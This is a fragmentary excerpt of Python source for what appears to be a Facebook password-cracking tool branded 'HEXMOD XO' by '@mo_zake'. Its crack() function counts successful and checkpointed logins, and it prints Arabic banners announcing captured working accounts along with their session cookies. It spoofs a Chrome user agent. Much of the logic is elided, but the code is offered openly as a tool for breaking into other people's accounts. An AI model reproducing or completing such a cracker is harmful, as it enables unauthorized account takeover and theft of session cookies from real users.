...
os.system('clear')
cetak(nel('\t• HEXMOD Tool Is running ...•'))
pretty.install()
CON = sol()
ua = UserAgent()
user_ahd = ua.chrome
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s• HEXMOD XO • %s/%s > OK %s > CP %s > %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'''Decode BY DEMO | @mo_zake
					🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ 👨🏻‍💻  جاك حساب سكيور 
          ┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
۝  @mo_zake ⚜️ HEXMOD XO ⚜️ @mo_zake   ۝ ┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
...
━━━━━━━━━━━HEXMOD XO━━━━━━━━━━━
				...
				if 'no' in taplikasi:
					...
					statusok = f'''Decode BY DEMO | @mo_zake
					🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ 👨🏻‍💻  جاك حساب شغال 
          ┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
۝  '' ⚜️ HEXMOD XO ⚜️ @mo_zake   ۝ ┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
...
𓅓 -  🇨​​​​​🇴​​​​​🇴​​​​​🇰​​​​​🇮​​​​​🇪​​​​​🇸​​​​​ : {kuki}
					...
					infoakun += f'''develped by | @mo_zake
				🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ 👨🏻‍💻  هيكس جابلك حساب شغال 
          ┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
۝  @mo_zake ⚜️ HEXMOD XO ⚜️ @mo_zake ۝ ┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
